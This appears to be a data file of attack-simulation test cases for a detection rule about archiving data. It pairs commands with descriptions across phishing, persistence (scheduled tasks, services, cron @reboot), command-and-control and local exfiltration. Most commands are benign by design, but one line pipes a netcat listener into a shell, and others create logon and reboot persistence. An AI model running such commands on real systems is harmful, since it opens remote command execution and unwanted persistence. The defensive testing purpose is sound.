rules.title: Detect Archive Collected Data via PowerShell

Scheduled tasks that use PowerShell to archive logs or backups.

attacks.description: Basic simulation of phishing by creating a fake login text file in the TEMP directory.
attacks.expected_behavior: Creates a text file in the TEMP directory with a fake login message.

attacks.description: Intermediate simulation using certutil to download a benign HTML file that mimics a phishing page.
attacks.expected_behavior: Downloads a benign HTML file to the TEMP directory, simulating a phishing page.

attacks.command: powershell -Command "Start-Process cmd -ArgumentList '/c powershell -Command \"$fakePrompt = New-Object System.Management.Automation.Host.Prompter\"; $fakePrompt.PromptForCredential('Fake Login', 'Enter your credentials:', 'fakeuser', 'fakepassword')\"'"
attacks.description: Advanced simulation using PowerShell to create a fake credential prompt.
attacks.expected_behavior: Displays a fake credential prompt without collecting any actual data.

attacks.command: echo 'Phishing simulation: Clicking this link might be harmful.' > $HOME/phishing_test.txt
attacks.description: Basic simulation of a phishing email by creating a text file with a benign warning message.
attacks.expected_behavior: A text file named 'phishing_test.txt' is created in the user's home directory containing a benign warning message.

attacks.command: echo 'Simulated phishing link: https://example.com' | mail -s 'Phishing Test' user@example.com
attacks.description: Intermediate simulation of a phishing email by sending a test email with a simulated phishing link.
attacks.expected_behavior: An email is sent to 'user@example.com' with a subject 'Phishing Test' containing a simulated phishing link.

attacks.description: Advanced simulation of a phishing attack by opening a web browser to a benign URL using PowerShell.
attacks.expected_behavior: A web browser (Firefox) is launched and navigates to 'https://example.com'.

attacks.command: net.exe schedule task /create /tn "TestTask" /tr "cmd.exe /c echo Test" /sc onlogon /f
attacks.description: Creates a scheduled task using net.exe to run a benign command at user logon.
attacks.expected_behavior: A scheduled task named 'TestTask' is created to execute 'cmd.exe /c echo Test' at user logon.

attacks.command: sc.exe create TestService binPath= "cmd.exe /c echo Test Service" start= auto
attacks.description: Creates a service using sc.exe that runs a benign command.
attacks.expected_behavior: A service named 'TestService' is created to run 'cmd.exe /c echo Test Service' on start.

attacks.command: powershell -Command "New-ScheduledTaskAction -Execute 'powershell' -Argument '-EncodedCommand UGFzc3dvcmQ='; New-ScheduledTaskTrigger -AtLogon; Register-ScheduledTask -Action (New-ScheduledTaskAction -Execute 'powershell' -Argument '-EncodedCommand UGFzc3dvcmQ=') -Trigger (New-ScheduledTaskTrigger -AtLogon) -TaskName 'EncodedTask' -Description 'Test Task'"
attacks.description: Creates a scheduled task using PowerShell with an encoded command to run a benign string.
attacks.expected_behavior: A scheduled task named 'EncodedTask' is created to execute an encoded PowerShell command at user logon.

attacks.command: echo 'echo Hello, World!' > $HOME/bin/startup.sh && chmod +x $HOME/bin/startup.sh && crontab -l | { cat; echo '@reboot $HOME/bin/startup.sh'; } | crontab -
attacks.description: This command creates a startup script that prints a message and schedules it to run at reboot using cron.
attacks.expected_behavior: The script will print 'Hello, World!' every time the system reboots.

attacks.command:
echo '#!/bin/bash
echo Custom startup message' > $HOME/bin/startup.bash && chmod +x $HOME/bin/startup.bash && (crontab -l 2>/dev/null; echo '@reboot $HOME/bin/startup.bash') | crontab -
attacks.description: This command creates a bash script and schedules it to run at system startup using cron.
attacks.expected_behavior: The script will print 'Custom startup message' every time the system reboots.

attacks.command:
echo '#!/bin/bash
echo Advanced startup task' > $HOME/bin/advanced_startup.sh && chmod +x $HOME/bin/advanced_startup.sh && (crontab -l 2>/dev/null; echo '@reboot sleep 10 && $HOME/bin/advanced_startup.sh') | crontab -
attacks.description: This command creates an advanced startup script with a delay and schedules it to run at system startup using cron.
attacks.expected_behavior: The script will print 'Advanced startup task' 10 seconds after the system reboots.

attacks.description: Basic command to list all listening ports and save the output to a temporary file.
attacks.expected_behavior: Outputs a list of all currently listening ports to a text file in the temporary directory.

attacks.command: powershell -Command "Start-Process -FilePath cmd -ArgumentList '/c echo Listening on ports: && netstat -an | findstr LISTENING'"
attacks.description: Intermediate command using PowerShell to start a command prompt process that lists listening ports.
attacks.expected_behavior: Opens a command prompt window displaying all listening ports.

attacks.description: Advanced command using certutil to fetch a file from a URL and save it to a temporary location.
attacks.expected_behavior: Downloads a test file from a specified URL and saves it to the temporary directory. Note: Requires internet access for real execution.

attacks.description: Basic command using netcat to check connectivity to a server on port 80.
attacks.expected_behavior: Netcat attempts to connect to example.com on port 80, displaying connection status.

attacks.description: Intermediate command using curl to fetch content from a benign URL.
attacks.expected_behavior: Curl silently fetches content from example.com, displaying no output if successful.

attacks.command: nc -lvp 4444 | sh & curl -s http://example.com | nc -w 3 localhost 4444
attacks.description: Advanced command combining netcat and curl to simulate a command and control interaction.
attacks.expected_behavior: Netcat listens on port 4444, curl fetches content from example.com, and pipes it to the listening netcat instance.

attacks.description: Basic command to encode a string and save it to a local file, simulating data exfiltration.
attacks.expected_behavior: The command encodes 'test data' into Base64 and saves it to a file in the %TEMP% directory.

attacks.description: Intermediate command that reads from a file, encodes the content, and writes it to another file, simulating a multi-step data exfiltration process.
attacks.expected_behavior: The command reads data from 'exfiltration.txt', encodes it, and saves it to 'exfiltration2.txt' in the %TEMP% directory.

attacks.description: Advanced command that reads encoded data, decodes it, and writes the binary data to a file, simulating a more complex exfiltration process.
attacks.expected_behavior: The command reads Base64 encoded data from 'exfiltration2.txt', decodes it, and writes the binary data to 'exfiltration3.bin' in the %TEMP% directory.

attacks.description: Basic local exfiltration simulation using netcat to listen and send data on localhost.
attacks.expected_behavior: This command sets up a local listener and sender using netcat, simulating data exfiltration over a C2 channel without actual network transmission.

attacks.command: echo 'test data' | socat TCP-LISTEN:12345,reuseaddr,fork EXEC:cat > /dev/null & socat TCP:localhost:12345 EXEC:cat < /dev/null
attacks.description: Intermediate exfiltration simulation using socat for listening and sending data on localhost.
attacks.expected_behavior: This command uses socat to create a local TCP listener and sender, simulating data exfiltration over a C2 channel without actual network transmission.

attacks.command: echo 'test data' | nc -l 12345 > /dev/null & nc -w 3 localhost 12345 < /dev/null && echo 'Exfiltration complete' > $HOME/exfil_test.txt
attacks.description: Advanced exfiltration simulation with confirmation, using netcat and file creation.
attacks.expected_behavior: This command sets up a local listener and sender using netcat, simulating data exfiltration over a C2 channel and writes a confirmation message to a file in the user's home directory.

attacks.description: Basic command to compress a test file into a ZIP archive using PowerShell.
attacks.expected_behavior: Creates a ZIP archive named 'testfile.zip' in the TEMP directory containing 'testfile.txt'.

attacks.description: Intermediate command to compress all text files in the TEMP directory into a ZIP archive using PowerShell.
attacks.expected_behavior: Creates a ZIP archive named 'texts.zip' in the TEMP directory containing all '.txt' files.

attacks.description: Basic command to archive files using tar without compression.
attacks.expected_behavior: Creates an archive named 'collected_data.tar' containing the specified data files.

attacks.description: Intermediate command to archive and compress files using tar with gzip.
attacks.expected_behavior: Creates a compressed archive 'collected_data.tar.gz' containing the specified data files.

attacks.description: Advanced command to create a temporary directory and archive data with compression.
attacks.expected_behavior: Creates a temporary directory '/tmp/archive' and a compressed archive 'collected_data.tar.gz' containing the specified data files.
